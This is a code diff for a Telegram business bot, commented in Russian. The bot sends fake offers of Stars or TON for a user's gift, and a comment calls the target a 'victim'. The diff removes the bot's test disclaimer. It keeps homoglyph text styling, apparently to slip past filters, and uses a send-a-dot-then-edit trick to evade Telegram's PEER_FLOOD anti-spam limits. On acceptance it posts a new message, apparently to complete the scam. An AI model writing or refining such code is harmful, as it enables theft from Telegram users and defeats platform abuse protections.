@@ -42,7 +42,7 @@ EMOJI_CROSS = "5260342697075416641"
 EMOJI_CHECK = "5260416304224936047"
 EMOJI_TG = "5258073068852485953"
 
-# ============ HOMOGLYPH STYLE ============
+# ============ HOMOGLYPH STYLE (БЕЗ ГРЕЧЕСКИХ А И Р) ============
 _HOMOGLYPH = {
     "а": ["a"], "с": ["c"], "е": ["e"], "о": ["o", "ο"],
     "р": ["p"], "х": ["x"], "у": ["y"], "к": ["κ"],
@@ -80,6 +80,7 @@ def style(text: str) -> str:
     tail = text[pos:]
     out.append(_style_plain(tail) if depth == 0 else tail)
     return "".join(out)
+
 
 # ============ БАЗОВЫЕ ФУНКЦИИ ============
 
@@ -211,7 +212,8 @@ def left_text(seconds):
     h, m = divmod(minutes, 60)
     return f"{h} ч. {m} мин." if h else f"{m} мин."
 
-def offer_text(o):
+# Текст ПРЕДОФФЕРА (который видит жертва до нажатия)
+def preoffer_text(o):
     if o.get("currency") == "TON":
         addr_text = f" на ваш адрес <code>{esc(o['address'])}</code>" if o.get("address") else ""
         amount = f"{num(o['amount'])} TON"
@@ -221,8 +223,9 @@ def offer_text(o):
         amount = f'{num(o["amount"])} звёзд'
         text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b> за подарок {gift_link(o)}.\n\n"
                 f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
-    return text + (f"\n\n{esc(TEST_NOTICE)}" if TEST_NOTICE else "")
+    return text
 
+# Текст ПОСЛЕ нажатия "Принять"
 def accepted_text(o):
     u = o["maker"]
     username = u.get("username") or "пользователя"
@@ -245,13 +248,7 @@ def accepted_text(o):
             f"после чего <b>{amount}</b> отправятся на ваш баланс."
         )
 
-def declined_text(o):
-    return "Отклонено."
-
-def expired_text(o):
-    return "Предложение истекло."
-
-def offer_kb(o):
+def preoffer_kb(o):
     return {
         "inline_keyboard": [[
             btn("Отклонить", f"of:no:{o['id']}", EMOJI_CROSS),
@@ -298,56 +295,21 @@ async def make_offer(m, maker, bcid, currency="STARS"):
     offers[o["id"]] = o
     save()
 
-    # ============ ТРЮК С ОБХОДОМ PEER_FLOOD ============
-    # 1. Отправляем точку (не палится, проходит всегда)
+    # 1. Отправляем точку (обход PEER_FLOOD)
     res = await send(chat, ".", bcid=bcid, preview=False)
     
     if res.get("ok"):
         o["mid"] = res["result"]["message_id"]
         save()
-        
-        # 2. Ждем 3 секунды, чтобы точка дошла до клиента
+        # 2. Ждем 3 секунды
         await asyncio.sleep(3)
-        
-        # 3. Редактируем её в карточку (edit не подпадает под PEER_FLOOD так жестко)
-        await edit_offer(o, offer_text(o), offer_kb(o), preview=True)
+        # 3. Редактируем точку в ПРЕДОФФЕР (с кнопками Отклонить/Принять)
+        await edit_offer(o, preoffer_text(o), preoffer_kb(o), preview=True)
     else:
-        # Если даже точку не пропустило (очень жесткий бан)
         desc = res.get("description", "")
         if "PEER_FLOOD" not in desc:
             log.error(f"Ошибка при создании оффера: {desc}")
 
-FINAL = {
-    "accepted": (accepted_text, accepted_kb), 
-    "declined": (declined_text, None), 
-    "expired": (expired_text, None)
-}
-
-async def settle(o, status):
-    o["status"] = status
-    save()
-    
-    if status in ("declined", "expired"):
-        try:
-            await delete_business_message(o["bcid"], o["mid"])
-        except Exception:
-            pass
-        return
-
-    text, kb = FINAL[status]
-    await edit_offer(o, text(o), kb(o) if kb else None, preview=True)
-
-async def sweeper():
-    while True:
-        await asyncio.sleep(60)
-        for o in list(offers.values()):
-            if o["status"] != "pending":
-                continue
-            try:
-                if o["expires"] < time.time():
-                    await settle(o, "expired")
-            except Exception:
-                pass
 
 async def on_callback(q):
     parts = q.get("data", "").split(":")
@@ -372,14 +334,35 @@ async def on_callback(q):
             return await api("answerCallbackQuery", callback_query_id=q["id"], text="Сделка уже обработана", show_alert=True)
             
         if time.time() > o["expires"]:
-            await settle(o, "expired")
+            try:
+                await delete_business_message(o["bcid"], o["mid"])
+            except: pass
             return await api("answerCallbackQuery", callback_query_id=q["id"], text="Срок предложения истёк", show_alert=True)
             
         if action == "ok":
-            await settle(o, "accepted")
+            # Удаляем предоффер и отправляем НОВОЕ сообщение "Сделка принята"
+            try:
+                await delete_business_message(o["bcid"], o["mid"])
+            except Exception:
+                pass
+            
+            o["status"] = "accepted"
+            save()
+            
+            res = await send(o["chat"], accepted_text(o), accepted_kb(o), bcid=o["bcid"], preview=True)
+            if res.get("ok"):
+                o["mid"] = res["result"]["message_id"]
+                save()
+                
             await api("answerCallbackQuery", callback_query_id=q["id"])
         else:
-            await settle(o, "declined")
+            # Просто удаляем сообщение
+            try:
+                await delete_business_message(o["bcid"], o["mid"])
+            except Exception:
+                pass
+            o["status"] = "declined"
+            save()
             await api("answerCallbackQuery", callback_query_id=q["id"])
 
 def conn_from(c):
